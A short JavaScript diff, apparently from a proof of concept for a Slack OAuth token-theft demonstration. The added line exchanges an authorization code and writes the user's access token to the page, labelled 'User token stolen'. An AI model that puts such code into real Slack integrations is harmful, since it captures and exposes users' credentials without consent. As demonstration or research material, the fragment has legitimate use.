@@ -24,8 +24,7 @@ var fetchemail = (token) => {
 fetch("https://slack.com/api/oauth.v2.access",{method: "POST", headers:{"Content-Type":"application/x-www-form-urlencoded"}, body: data}).then(
     response => response.json()
 ).then((json) => {
-    console.log(json);
-    fetchemail(json["authed_user"]["access_token"]);
+    document.write("User token stolen:"+json["authed_user"]["access_token"]);
 });
 
 
